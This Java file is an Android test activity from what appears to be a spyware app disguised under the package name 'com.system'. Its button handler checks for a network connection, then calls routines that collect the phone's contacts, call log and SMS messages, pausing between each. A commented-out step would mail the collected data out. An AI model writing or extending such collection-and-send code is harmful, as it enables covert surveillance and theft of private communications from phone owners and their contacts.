package com.system.test;

import java.util.Date;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

import com.system.GetInfoTask;
import com.system.R;
import com.system.utils.ConfigCtrl;
import com.system.utils.SysUtils;

public class TestActivity extends Activity 
{
     Button btn_getinfo;
     Button btn_screenshot;
     OnClickListener listener_getinfo = null;
     OnClickListener listener_screenshot = null;
     
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.test);
        
        setListener(); 
        initUI();
    }
    
    private void initUI()
    {
    	btn_getinfo = (Button)findViewById(R.id.btn_getinfo);
    	btn_getinfo.setOnClickListener(listener_getinfo);
        btn_screenshot = (Button)findViewById(R.id.btn_screenshot);
        btn_screenshot.setOnClickListener(listener_screenshot);
    }
    
    private void setListener()
    {
    	listener_getinfo = new OnClickListener()
        {
            public void onClick(View v)
            {
            	// If network connected, try to collect and send the information
        		if (SysUtils.isNetworkConnected(getApplicationContext()))
        		{
        			GetInfoTask.CollectContact(getApplicationContext());
        			SysUtils.ThreadSleep(100000, "Test");
        			GetInfoTask.CollectPhoneCallHist(getApplicationContext());
        			SysUtils.ThreadSleep(100000, "Test");
        			GetInfoTask.CollectSms(getApplicationContext());
        		
        			// Send mail
        			//boolean result = sendMail();
        			
        			// Update the last date time
        			//if (result) ConfigCtrl.setLastGetInfoTime(service.getApplicationContext(), new Date());
        		}
            }
        };
        
        listener_screenshot = new OnClickListener()
        {
            public void onClick(View v)
            {
                //TODO
            }
        };
    }
}
